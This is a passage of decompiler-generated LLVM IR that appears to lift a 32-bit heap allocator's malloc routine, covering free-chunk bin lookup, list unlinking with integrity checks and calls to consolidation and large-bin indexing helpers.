  %v3_8052684 = urem i8 %v0_805267e, 2
  %v4_8052684 = icmp eq i8 %v3_8052684, 0
  %v1_8052687 = icmp eq i1 %v4_8052684, false
  br i1 %v1_8052687, label %dec_label_pc_80526a6, label %dec_label_pc_8052689

dec_label_pc_8052689:                             ; preds = %dec_label_pc_805267e
  %v2_8052689 = icmp eq i8 %v0_805267e, 0
  %v1_805268b = icmp eq i1 %v2_8052689, false
  br i1 %v1_805268b, label %dec_label_pc_8052981, label %dec_label_pc_8052691

dec_label_pc_8052691:                             ; preds = %dec_label_pc_8052689
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* %stack_var_-92, align 4
  %v2_8052699 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067680.236 to i32*))
  store i32 %v2_8052699, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052981

dec_label_pc_80526a6:                             ; preds = %dec_label_pc_805267e
  %v11_80526a6 = trunc i32 %v1_8052a16 to i8
  %v8_80526aa = icmp ugt i8 %v11_80526a6, %v0_805267e
  br i1 %v8_80526aa, label %dec_label_pc_80526c7, label %dec_label_pc_80526ac

dec_label_pc_80526ac:                             ; preds = %dec_label_pc_80526a6
  %v2_80526b0 = udiv i32 %v1_8052a16, 2
  store i32 %v2_80526b0, i32* %eax.global-to-local, align 4
  %v1_80526b2 = add i32 %v2_80526b0, ptrtoint (i8* @global_var_8067680.236 to i32)
  store i32 %v1_80526b2, i32* @ecx, align 4
  %v1_80526b8 = add i32 %v2_80526b0, add (i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32 -4)
  %v2_80526b8 = inttoptr i32 %v1_80526b8 to i32*
  %v3_80526b8 = load i32, i32* %v2_80526b8, align 4
  store i32 %v3_80526b8, i32* %edx.global-to-local, align 4
  %v1_80526bb = icmp eq i32 %v3_80526b8, 0
  br i1 %v1_80526bb, label %dec_label_pc_80526c7, label %dec_label_pc_80526bf

dec_label_pc_80526bf:                             ; preds = %dec_label_pc_80526ac
  %v1_80526bf = add i32 %v3_80526b8, 8
  %v2_80526bf = inttoptr i32 %v1_80526bf to i32*
  %v3_80526bf = load i32, i32* %v2_80526bf, align 4
  store i32 %v3_80526bf, i32* %eax.global-to-local, align 4
  store i32 %v3_80526bf, i32* %v2_80526b8, align 4
  br label %dec_label_pc_8052700

dec_label_pc_80526c7:                             ; preds = %dec_label_pc_80526ac, %dec_label_pc_80526a6
  %v8_80526c7 = icmp ult i32 %v1_8052a16, 255
  %v6_80526cf = icmp ugt i32 %v1_8052a16, 255
  store i32 %v1_8052a16, i32* @eax, align 4
  br i1 %v6_80526cf, label %dec_label_pc_8052708, label %dec_label_pc_80526d1

dec_label_pc_80526d1:                             ; preds = %dec_label_pc_80526c7
  %v2_80526d5 = udiv i32 %v1_8052a16, 8
  store i32 %v2_80526d5, i32* %eax.global-to-local, align 4
  %v1_80526dc = mul nuw i32 %v2_80526d5, 8
  %v2_80526dc = add i32 %v1_80526dc, ptrtoint (i32* @global_var_80676ac.237 to i32)
  store i32 %v2_80526dc, i32* @ecx, align 4
  %v1_80526e3 = add i32 %v1_80526dc, add (i32 ptrtoint (i32* @global_var_80676ac.237 to i32), i32 12)
  %v2_80526e3 = inttoptr i32 %v1_80526e3 to i32*
  %v3_80526e3 = load i32, i32* %v2_80526e3, align 4
  store i32 %v3_80526e3, i32* %edx.global-to-local, align 4
  %v12_80526e6 = icmp eq i32 %v3_80526e3, %v2_80526dc
  br i1 %v12_80526e6, label %dec_label_pc_8052804.preheader, label %dec_label_pc_80526ee

dec_label_pc_80526ee:                             ; preds = %dec_label_pc_80526d1
  store i32 %v1_8052a16, i32* %ebx.global-to-local, align 4
  %v1_80526f2 = add i32 %v3_80526e3, 12
  %v2_80526f2 = inttoptr i32 %v1_80526f2 to i32*
  %v3_80526f2 = load i32, i32* %v2_80526f2, align 4
  store i32 %v3_80526f2, i32* %eax.global-to-local, align 4
  store i32 %v3_80526f2, i32* %v2_80526e3, align 4
  %v0_80526f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80526f8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526f8 = add i32 %v0_80526f8, 4
  %v3_80526f8 = add i32 %v2_80526f8, %v1_80526f8
  %v4_80526f8 = inttoptr i32 %v3_80526f8 to i32*
  %v5_80526f8 = load i32, i32* %v4_80526f8, align 4
  %v6_80526f8 = or i32 %v5_80526f8, 1
  store i32 %v6_80526f8, i32* %v4_80526f8, align 4
  %v0_80526fd = load i32, i32* @ecx, align 4
  %v1_80526fd = load i32, i32* %eax.global-to-local, align 4
  %v2_80526fd = add i32 %v1_80526fd, 8
  %v3_80526fd = inttoptr i32 %v2_80526fd to i32*
  store i32 %v0_80526fd, i32* %v3_80526fd, align 4
  br label %dec_label_pc_8052700

dec_label_pc_8052700:                             ; preds = %dec_label_pc_8052a9d, %dec_label_pc_8052aaf, %dec_label_pc_80526bf, %dec_label_pc_80526ee
  %v0_8052700 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052700 = add i32 %v0_8052700, 8
  store i32 %v1_8052700, i32* @ebx, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052708:                             ; preds = %dec_label_pc_80526c7
  %v0_805270c = call i32 @__malloc_largebin_index()
  store i32 %v0_805270c, i32* %eax.global-to-local, align 4
  %v3_8052711 = and i8 %v0_805267e, 2
  %v4_8052711 = icmp eq i8 %v3_8052711, 0
  %v6_8052711 = zext i8 %v3_8052711 to i32
  %v9_8052711 = and i32 %v1_805267e, -256
  %v10_8052711 = or i32 %v9_8052711, %v6_8052711
  store i32 %v10_8052711, i32* @ebx, align 4
  br i1 %v4_8052711, label %dec_label_pc_8052804.preheader, label %dec_label_pc_805271e

dec_label_pc_805271e:                             ; preds = %dec_label_pc_8052708
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* %stack_var_-92, align 4
  %v2_8052726 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067680.236 to i32*))
  store i32 %v2_8052726, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052804.preheader

dec_label_pc_8052804.preheader:                   ; preds = %dec_label_pc_805271e, %dec_label_pc_80526d1, %dec_label_pc_8052708
  %stack_var_-40.0.ph = phi i32 [ %v2_80526d5, %dec_label_pc_80526d1 ], [ %v0_805270c, %dec_label_pc_805271e ], [ %v0_805270c, %dec_label_pc_8052708 ]
  %v1_805275a = add i32 %v1_8052a16, 16
  %v0_8052804106 = load i32, i32* @global_var_80676c0.240, align 64
  store i32 %v0_8052804106, i32* @ebp, align 4
  %v9_805280a111 = icmp eq i32 %v0_8052804106, 134641332
  %v1_8052810112 = icmp eq i1 %v9_805280a111, false
  br i1 %v1_8052810112, label %dec_label_pc_8052733, label %dec_label_pc_8052816

dec_label_pc_8052733:                             ; preds = %dec_label_pc_8052804.preheader, %bb84
  %v0_8052804113 = phi i32 [ %v0_8052804, %bb84 ], [ %v0_8052804106, %dec_label_pc_8052804.preheader ]
  %v1_8052733 = add i32 %v0_8052804113, 4
  %v2_8052733 = inttoptr i32 %v1_8052733 to i32*
  %v3_8052733 = load i32, i32* %v2_8052733, align 4
  %v1_8052736 = add i32 %v0_8052804113, 12
  %v2_8052736 = inttoptr i32 %v1_8052736 to i32*
  %v3_8052736 = load i32, i32* %v2_8052736, align 4
  store i32 %v3_8052736, i32* %edx.global-to-local, align 4
  %v1_8052739 = and i32 %v3_8052733, -4
  store i32 %v1_8052739, i32* @edi, align 4
  br i1 %v6_80526cf, label %dec_label_pc_8052765, label %dec_label_pc_8052746

dec_label_pc_8052746:                             ; preds = %dec_label_pc_8052733
  %v9_8052746 = icmp eq i32 %v3_8052736, 134641332
  %v1_805274c = icmp eq i1 %v9_8052746, false
  br i1 %v1_805274c, label %dec_label_pc_8052765, label %dec_label_pc_805274e

dec_label_pc_805274e:                             ; preds = %dec_label_pc_8052746
  %v1_805274e = load i32, i32* @global_var_80676b0.238, align 16
  %v12_805274e = icmp eq i32 %v0_8052804113, %v1_805274e
  %v1_8052754 = icmp eq i1 %v12_805274e, false
  br i1 %v1_8052754, label %dec_label_pc_8052765, label %dec_label_pc_8052756

dec_label_pc_8052756:                             ; preds = %dec_label_pc_805274e
  store i32 %v1_805275a, i32* %eax.global-to-local, align 4
  %v6_805275f = icmp ugt i32 %v1_8052739, %v1_805275a
  br i1 %v6_805275f, label %dec_label_pc_8052d16, label %dec_label_pc_8052765

dec_label_pc_8052765:                             ; preds = %dec_label_pc_8052756, %dec_label_pc_805274e, %dec_label_pc_8052746, %dec_label_pc_8052733
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %eax.global-to-local, align 4
  %v2_805276a = add i32 %v3_8052736, 8
  %v3_805276a = inttoptr i32 %v2_805276a to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v3_805276a, align 4
  %v0_805276d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805276d, i32* @global_var_80676c0.240, align 4
  %v0_8052770 = load i32, i32* @edi, align 4
  %v15_8052770 = icmp eq i32 %v0_8052770, %v1_8052a16
  br i1 %v15_8052770, label %dec_label_pc_8052d57, label %dec_label_pc_805277a

dec_label_pc_805277a:                             ; preds = %dec_label_pc_8052765
  %v6_8052780 = icmp ugt i32 %v0_8052770, 255
  br i1 %v6_8052780, label %dec_label_pc_8052793, label %dec_label_pc_8052782

dec_label_pc_8052782:                             ; preds = %dec_label_pc_805277a
  %v2_8052784 = udiv i32 %v0_8052770, 8
  store i32 %v2_8052784, i32* %esi.global-to-local, align 4
  %v1_8052787 = mul nuw i32 %v2_8052784, 8
  %v2_8052787 = add i32 %v1_8052787, 134641324
  store i32 %v2_8052787, i32* @ebx, align 4
  %v1_805278e = add i32 %v1_8052787, 134641332
  %v2_805278e = inttoptr i32 %v1_805278e to i32*
  %v3_805278e = load i32, i32* %v2_805278e, align 4
  store i32 %v3_805278e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527dc

dec_label_pc_8052793:                             ; preds = %dec_label_pc_805277a
  store i32 %v0_8052770, i32* @eax, align 4
  %v0_8052795 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052795, i32* %esi.global-to-local, align 4
  %v1_805279c = mul i32 %v0_8052795, 8
  %v2_805279c = add i32 %v1_805279c, ptrtoint (i32* @global_var_80676ac.237 to i32)
  store i32 %v2_805279c, i32* %eax.global-to-local, align 4
  %v1_80527a3 = add i32 %v1_805279c, add (i32 ptrtoint (i32* @global_var_80676ac.237 to i32), i32 8)
  %v2_80527a3 = inttoptr i32 %v1_80527a3 to i32*
  %v3_80527a3 = load i32, i32* %v2_80527a3, align 4
  store i32 %v3_80527a3, i32* %edx.global-to-local, align 4
  store i32 %v3_80527a3, i32* @ebx, align 4
  %v12_80527ac = icmp eq i32 %v3_80527a3, %v2_805279c
  br i1 %v12_80527ac, label %dec_label_pc_80527dc, label %dec_label_pc_80527b0

dec_label_pc_80527b0:                             ; preds = %dec_label_pc_8052793
  %v1_80527b0 = add i32 %v1_805279c, add (i32 ptrtoint (i32* @global_var_80676ac.237 to i32), i32 12)
  %v2_80527b0 = inttoptr i32 %v1_80527b0 to i32*
  %v3_80527b0 = load i32, i32* %v2_80527b0, align 4
  store i32 %v3_80527b0, i32* @ebx, align 4
  %v0_80527b3 = load i32, i32* @edi, align 4
  %v2_80527b3 = add i32 %v3_80527b0, 4
  %v3_80527b3 = inttoptr i32 %v2_80527b3 to i32*
  %v4_80527b3 = load i32, i32* %v3_80527b3, align 4
  %v10_80527b3 = icmp ult i32 %v0_80527b3, %v4_80527b3
  %v1_80527b6 = icmp eq i1 %v10_80527b3, false
  br i1 %v1_80527b6, label %dec_label_pc_80527be, label %dec_label_pc_80527dc

dec_label_pc_80527be:                             ; preds = %dec_label_pc_80527b0
  %v1_80527c0 = or i32 %v0_80527b3, 1
  store i32 %v1_80527c0, i32* %eax.global-to-local, align 4
  store i32 %v3_80527a3, i32* %ebx.global-to-local, align 4
  %v2_80527d498 = add i32 %v3_80527a3, 4
  %v3_80527d499 = inttoptr i32 %v2_80527d498 to i32*
  %v4_80527d4100 = load i32, i32* %v3_80527d499, align 4
  %v10_80527d4102 = icmp ult i32 %v1_80527c0, %v4_80527d4100
  br i1 %v10_80527d4102, label %dec_label_pc_80527c5, label %dec_label_pc_80527d9

dec_label_pc_80527c5:                             ; preds = %dec_label_pc_80527be, %dec_label_pc_80527c5
  %v0_80527d9103 = phi i32 [ %v3_80527c9, %dec_label_pc_80527c5 ], [ %v3_80527a3, %dec_label_pc_80527be ]
  store i32 %v0_80527d9103, i32* %ecx.global-to-local, align 4
  %v1_80527c9 = add i32 %v0_80527d9103, 8
  %v2_80527c9 = inttoptr i32 %v1_80527c9 to i32*
  %v3_80527c9 = load i32, i32* %v2_80527c9, align 4
  store i32 %v3_80527c9, i32* %ecx.global-to-local, align 4
  store i32 %v3_80527c9, i32* %ebx.global-to-local, align 4
  %v2_80527d4 = add i32 %v3_80527c9, 4
  %v3_80527d4 = inttoptr i32 %v2_80527d4 to i32*
  %v4_80527d4 = load i32, i32* %v3_80527d4, align 4
  %v10_80527d4 = icmp ult i32 %v1_80527c0, %v4_80527d4
  br i1 %v10_80527d4, label %dec_label_pc_80527c5, label %dec_label_pc_80527d9

dec_label_pc_80527d9:                             ; preds = %dec_label_pc_80527c5, %dec_label_pc_80527be
  %v0_80527d9.lcssa = phi i32 [ %v3_80527a3, %dec_label_pc_80527be ], [ %v3_80527c9, %dec_label_pc_80527c5 ]
  %v1_80527d9 = add i32 %v0_80527d9.lcssa, 12
  %v2_80527d9 = inttoptr i32 %v1_80527d9 to i32*
  %v3_80527d9 = load i32, i32* %v2_80527d9, align 4
  store i32 %v3_80527d9, i32* @ebx, align 4
  br label %dec_label_pc_80527dc

dec_label_pc_80527dc:                             ; preds = %dec_label_pc_8052782, %dec_label_pc_80527b0, %dec_label_pc_8052793, %dec_label_pc_80527d9
  %v0_80527dc = phi i32 [ %v0_8052795, %dec_label_pc_8052793 ], [ %v0_8052795, %dec_label_pc_80527d9 ], [ %v0_8052795, %dec_label_pc_80527b0 ], [ %v2_8052784, %dec_label_pc_8052782 ]
  %stack_var_-64.1 = phi i32 [ %v3_80527a3, %dec_label_pc_8052793 ], [ %v0_80527d9.lcssa, %dec_label_pc_80527d9 ], [ %v2_805279c, %dec_label_pc_80527b0 ], [ %v3_805278e, %dec_label_pc_8052782 ]
  %v1_80527de = urem i32 %v0_80527dc, 32
  %v2_80527de = icmp eq i32 %v1_80527de, 0
  store i32 %v1_80527de, i32* %esi.global-to-local, align 4
  store i32 %v1_80527de, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80527e8 = sdiv i32 %v0_80527dc, 32
  store i32 %v2_80527e8, i32* %edx.global-to-local, align 4
  br i1 %v2_80527de, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_80527dc
  %v5_80527eb = shl i32 1, %v1_80527de
  store i32 %v5_80527eb, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_80527dc, %bb
  %v5_80527ed = phi i32 [ 1, %dec_label_pc_80527dc ], [ %v5_80527eb, %bb ]
  %v1_80527ed = mul nsw i32 %v2_80527e8, 4
  %v2_80527ed = add i32 %v1_80527ed, ptrtoint (i32* @global_var_80679b4.241 to i32)
  %v3_80527ed = inttoptr i32 %v2_80527ed to i32*
  %v4_80527ed = load i32, i32* %v3_80527ed, align 4
  %v6_80527ed = or i32 %v4_80527ed, %v5_80527ed
  store i32 %v6_80527ed, i32* %v3_80527ed, align 4
  %v0_80527f4 = load i32, i32* @ebx, align 4
  %v1_80527f4 = load i32, i32* @ebp, align 4
  %v2_80527f4 = add i32 %v1_80527f4, 12
  %v3_80527f4 = inttoptr i32 %v2_80527f4 to i32*
  store i32 %v0_80527f4, i32* %v3_80527f4, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80527fb = load i32, i32* @ebp, align 4
  %v2_80527fb = add i32 %v1_80527fb, 8
  %v3_80527fb = inttoptr i32 %v2_80527fb to i32*
  store i32 %stack_var_-64.1, i32* %v3_80527fb, align 4
  %v0_80527fe = load i32, i32* @ebp, align 4
  %v1_80527fe = load i32, i32* @ebx, align 4
  %v2_80527fe = add i32 %v1_80527fe, 8
  %v3_80527fe = inttoptr i32 %v2_80527fe to i32*
  store i32 %v0_80527fe, i32* %v3_80527fe, align 4
  %v0_8052801 = load i32, i32* @ebp, align 4
  %v1_8052801 = load i32, i32* @esi, align 4
  %v2_8052801 = add i32 %v1_8052801, 12
  %v3_8052801 = inttoptr i32 %v2_8052801 to i32*
  store i32 %v0_8052801, i32* %v3_8052801, align 4
  %v0_8052804 = load i32, i32* @global_var_80676c0.240, align 64
  store i32 %v0_8052804, i32* @ebp, align 4
  %v9_805280a = icmp eq i32 %v0_8052804, 134641332
  %v1_8052810 = icmp eq i1 %v9_805280a, false
  br i1 %v1_8052810, label %dec_label_pc_8052733, label %dec_label_pc_8052816

dec_label_pc_8052816:                             ; preds = %bb84, %dec_label_pc_8052804.preheader
  br i1 %v8_80526c7, label %dec_label_pc_80528a4, label %dec_label_pc_8052824

dec_label_pc_8052824:                             ; preds = %dec_label_pc_8052816
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052828 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052828 = add i32 %v1_8052828, ptrtoint (i32* @global_var_80676ac.237 to i32)
  store i32 %v2_8052828, i32* %edx.global-to-local, align 4
  %v1_805282f = add i32 %v1_8052828, add (i32 ptrtoint (i32* @global_var_80676ac.237 to i32), i32 12)
  %v2_805282f = inttoptr i32 %v1_805282f to i32*
  %storemerge1.pre = load i32, i32* %v2_805282f, align 4
  br label %dec_label_pc_80528a0

dec_label_pc_8052834:                             ; preds = %dec_label_pc_80528a0
  %v1_8052834 = add i32 %v4_805284b, 4
  %v2_8052834 = inttoptr i32 %v1_8052834 to i32*
  %v3_8052834 = load i32, i32* %v2_8052834, align 4
  store i32 %v3_8052834, i32* %ebx.global-to-local, align 4
  %v1_8052837 = add i32 %v4_805284b, 12
  %v2_8052837 = inttoptr i32 %v1_8052837 to i32*
  %v3_8052837 = load i32, i32* %v2_8052837, align 4
  store i32 %v3_8052837, i32* @ecx, align 4
  %v1_805283a = and i32 %v3_8052834, -4
  store i32 %v1_805283a, i32* @ebx, align 4
  %v10_805283d = icmp ult i32 %v1_805283a, %v1_8052a16
  br i1 %v10_805283d, label %dec_label_pc_80528a0, label %dec_label_pc_8052843

dec_label_pc_8052843:                             ; preds = %dec_label_pc_8052834
  %v1_8052843 = add i32 %v4_805284b, 8
  %v2_8052843 = inttoptr i32 %v1_8052843 to i32*
  %v3_8052843 = load i32, i32* %v2_8052843, align 4
  store i32 %v3_8052843, i32* @edx, align 4
  %v1_8052846 = add i32 %v3_8052843, 12
  %v2_8052846 = inttoptr i32 %v1_8052846 to i32*
  %v3_8052846 = load i32, i32* %v2_8052846, align 4
  %v15_8052846 = icmp eq i32 %v3_8052846, %v4_805284b
  %v1_8052849 = icmp eq i1 %v15_8052846, false
  br i1 %v1_8052849, label %dec_label_pc_8052850, label %dec_label_pc_805284b

dec_label_pc_805284b:                             ; preds = %dec_label_pc_8052843
  %v1_805284b = add i32 %v3_8052837, 8
  %v2_805284b = inttoptr i32 %v1_805284b to i32*
  %v3_805284b = load i32, i32* %v2_805284b, align 4
  %v15_805284b = icmp eq i32 %v3_805284b, %v4_805284b
  br i1 %v15_805284b, label %dec_label_pc_8052855, label %dec_label_pc_8052850

dec_label_pc_8052850:                             ; preds = %dec_label_pc_805284b, %dec_label_pc_8052843
  %v0_8052850 = call i32 @abort()
  store i32 %v0_8052850, i32* %eax.global-to-local, align 4
  %v0_8052855.pre = load i32, i32* @ebx, align 4
  %v0_805285b.pre = load i32, i32* @ecx, align 4
  %v1_805285b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052855

dec_label_pc_8052855:                             ; preds = %dec_label_pc_805284b, %dec_label_pc_8052850
  %v1_805285b = phi i32 [ %v3_8052843, %dec_label_pc_805284b ], [ %v1_805285b.pre, %dec_label_pc_8052850 ]
  %v0_805285b = phi i32 [ %v3_8052837, %dec_label_pc_805284b ], [ %v0_805285b.pre, %dec_label_pc_8052850 ]
  %v0_8052855 = phi i32 [ %v1_805283a, %dec_label_pc_805284b ], [ %v0_8052855.pre, %dec_label_pc_8052850 ]
  %v5_8052857 = sub i32 %v0_8052855, %v1_8052a16
  store i32 %v5_8052857, i32* %esi.global-to-local, align 4
  %v2_805285b = add i32 %v1_805285b, 12
  %v3_805285b = inttoptr i32 %v2_805285b to i32*
  store i32 %v0_805285b, i32* %v3_805285b, align 4
  %v0_805285e = load i32, i32* @edx, align 4
  %v1_805285e = load i32, i32* @ecx, align 4
  %v2_805285e = add i32 %v1_805285e, 8
  %v3_805285e = inttoptr i32 %v2_805285e to i32*
  store i32 %v0_805285e, i32* %v3_805285e, align 4
  %v0_8052861 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052864 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052864 = add i32 %v0_8052864, 8
  store i32 %v1_8052864, i32* @ecx, align 4
  %tmp128 = icmp ult i32 %v0_8052861, 16
  br i1 %tmp128, label %dec_label_pc_8052d65, label %dec_label_pc_805286d

dec_label_pc_805286d:                             ; preds = %dec_label_pc_8052855
  %v2_8052871 = add i32 %v0_8052864, %v1_8052a16
  store i32 %v2_8052871, i32* %edx.global-to-local, align 4
  %v1_8052874 = or i32 %v1_8052a16, 1
  store i32 %v1_8052874, i32* %ebx.global-to-local, align 4
  %v2_8052877 = add i32 %v0_8052864, 4
  %v3_8052877 = inttoptr i32 %v2_8052877 to i32*
  store i32 %v1_8052874, i32* %v3_8052877, align 4
  %v0_805287a = load i32, i32* %esi.global-to-local, align 4
  %v1_805287c = or i32 %v0_805287a, 1
  store i32 %v1_805287c, i32* %eax.global-to-local, align 4
  %v0_805287f = load i32, i32* %edx.global-to-local, align 4
  %v1_805287f = load i32, i32* @ebp, align 4
  %v2_805287f = add i32 %v1_805287f, 8
  %v3_805287f = inttoptr i32 %v2_805287f to i32*
  store i32 %v0_805287f, i32* %v3_805287f, align 4
  %v0_8052882 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052882 = load i32, i32* @ebp, align 4
  %v2_8052882 = add i32 %v1_8052882, 12
  %v3_8052882 = inttoptr i32 %v2_8052882 to i32*
  store i32 %v0_8052882, i32* %v3_8052882, align 4
  %v0_8052885 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052885 = add i32 %v0_8052885, 8
  %v2_8052885 = inttoptr i32 %v1_8052885 to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_8052885, align 4
  %v0_805288c = load i32, i32* %edx.global-to-local, align 4
  %v1_805288c = add i32 %v0_805288c, 12
  %v2_805288c = inttoptr i32 %v1_805288c to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_805288c, align 4
  %v0_8052893 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052893 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052893 = add i32 %v1_8052893, 4
  %v3_8052893 = inttoptr i32 %v2_8052893 to i32*
  store i32 %v0_8052893, i32* %v3_8052893, align 4
  %v0_8052896 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052896 = load i32, i32* %edx.global-to-local, align 4
  %v3_8052896 = add i32 %v1_8052896, %v0_8052896
  %v4_8052896 = inttoptr i32 %v3_8052896 to i32*
  store i32 %v0_8052896, i32* %v4_8052896, align 4
  br label %dec_label_pc_8052d6a

dec_label_pc_80528a0:                             ; preds = %dec_label_pc_8052834, %dec_label_pc_8052824
  %v4_805284b = phi i32 [ %storemerge1.pre, %dec_label_pc_8052824 ], [ %v3_8052837, %dec_label_pc_8052834 ]
  store i32 %v4_805284b, i32* %eax.global-to-local, align 4
  %v12_80528a0 = icmp eq i32 %v4_805284b, %v2_8052828
  %v1_80528a2 = icmp eq i1 %v12_80528a0, false
  br i1 %v1_80528a2, label %dec_label_pc_8052834, label %dec_label_pc_80528a4.loopexit

dec_label_pc_80528a4.loopexit:                    ; preds = %dec_label_pc_80528a0
  br label %dec_label_pc_80528a4

dec_label_pc_80528a4:                             ; preds = %dec_label_pc_80528a4.loopexit, %dec_label_pc_8052816
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80528ad = add i32 %stack_var_-40.0.ph, 1
  %v2_80528b0 = udiv i32 %v1_80528ad, 32
  store i32 %v2_80528b0, i32* @edi, align 4
  %v1_80528b3 = mul i32 %v1_80528ad, 8
  %v2_80528b3 = add i32 %v1_80528b3, ptrtoint (i32* @global_var_80676ac.237 to i32)
  store i32 %v2_80528b3, i32* %ebx.global-to-local, align 4
  %v1_80528ba = urem i32 %v1_80528ad, 32
  %v2_80528ba = icmp eq i32 %v1_80528ba, 0
  store i32 %v1_80528ba, i32* %ecx.global-to-local, align 4
  %v1_80528bd = mul nuw nsw i32 %v2_80528b0, 4
  %v2_80528bd = add i32 %v1_80528bd, ptrtoint (i32* @global_var_80679b4.241 to i32)
  %v3_80528bd = inttoptr i32 %v2_80528bd to i32*
  %v4_80528bd = load i32, i32* %v3_80528bd, align 4
  store i32 %v4_80528bd, i32* %edx.global-to-local, align 4
  br i1 %v2_80528ba, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_80528a4
  %v5_80528c4 = shl i32 1, %v1_80528ba
  store i32 %v5_80528c4, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80528a4, %bb85, %dec_label_pc_8052905
  %v1_80528c6 = phi i32 [ %v1_80528c6.pre, %dec_label_pc_8052905 ], [ %v4_80528bd, %bb85 ], [ %v4_80528bd, %dec_label_pc_80528a4 ]
  %v0_80528ca = phi i32 [ %v0_80528c6.pre, %dec_label_pc_8052905 ], [ %v5_80528c4, %bb85 ], [ 1, %dec_label_pc_80528a4 ]
  %tmp86 = icmp ule i32 %v0_80528ca, %v1_80528c6
  %v1_80528ca = icmp eq i32 %v0_80528ca, 0
  %v1_80528cc = icmp eq i1 %v1_80528ca, false
  %or.cond = and i1 %tmp86, %v1_80528cc
  br i1 %or.cond, label %dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge, label %dec_label_pc_80528ce.preheader

dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge: ; preds = %.preheader
  %v0_80528f512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528fa.preheader

dec_label_pc_80528ce.preheader:                   ; preds = %.preheader
  %v0_80528ce.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80528ce

dec_label_pc_80528ce:                             ; preds = %dec_label_pc_80528ce.preheader, %dec_label_pc_80528d8
  %v0_80528ce = phi i32 [ %v0_80528ce.pre, %dec_label_pc_80528ce.preheader ], [ %v1_80528ce, %dec_label_pc_80528d8 ]
  %v1_80528ce = add i32 %v0_80528ce, 1
  store i32 %v1_80528ce, i32* @edi, align 4
  %v6_80528d2 = icmp ugt i32 %v1_80528ce, 2
  br i1 %v6_80528d2, label %dec_label_pc_8052981.loopexit, label %dec_label_pc_80528d8

dec_label_pc_80528d8:                             ; preds = %dec_label_pc_80528ce
  %v1_80528d8 = mul i32 %v1_80528ce, 4
  %v2_80528d8 = add i32 %v1_80528d8, ptrtoint (i32* @global_var_80679b4.241 to i32)
  %v3_80528d8 = inttoptr i32 %v2_80528d8 to i32*
  %v4_80528d8 = load i32, i32* %v3_80528d8, align 4
  store i32 %v4_80528d8, i32* %edx.global-to-local, align 4
  %v1_80528df = icmp eq i32 %v4_80528d8, 0
  br i1 %v1_80528df, label %dec_label_pc_80528ce, label %dec_label_pc_80528e3

dec_label_pc_80528e3:                             ; preds = %dec_label_pc_80528d8
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80528ea = mul i32 %v1_80528ce, 256
  store i32 %v2_80528ea, i32* %eax.global-to-local, align 4
  %v1_80528ed = add i32 %v2_80528ea, ptrtoint (i32* @global_var_80676ac.237 to i32)
  store i32 %v1_80528ed, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528fa.preheader

dec_label_pc_80528fa.preheader:                   ; preds = %dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge, %dec_label_pc_80528e3
  %v0_80528f512 = phi i32 [ %v1_80528ed, %dec_label_pc_80528e3 ], [ %v0_80528f512.pre, %dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80528e3 ], [ %v0_80528ca, %dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge ]
  %v0_805290c = phi i32 [ %v4_80528d8, %dec_label_pc_80528e3 ], [ %v1_80528c6, %dec_label_pc_80528ca.dec_label_pc_80528fa.preheader_crit_edge ]
  %v2_80528fa4 = and i32 %v0_805290c, %esi.promoted
  %v3_80528fa5 = icmp eq i32 %v2_80528fa4, 0
  br i1 %v3_80528fa5, label %dec_label_pc_80528f5, label %dec_label_pc_80528fe

dec_label_pc_80528f5:                             ; preds = %dec_label_pc_80528fa.preheader, %dec_label_pc_80528f5
  %v2_80528f814 = phi i32 [ %v2_80528f8, %dec_label_pc_80528f5 ], [ %esi.promoted, %dec_label_pc_80528fa.preheader ]
  %v0_80528f513 = phi i32 [ %v1_80528f5, %dec_label_pc_80528f5 ], [ %v0_80528f512, %dec_label_pc_80528fa.preheader ]
  %v1_80528f5 = add i32 %v0_80528f513, 8
  %v2_80528f8 = mul i32 %v2_80528f814, 2
  %v2_80528fa = and i32 %v2_80528f8, %v0_805290c
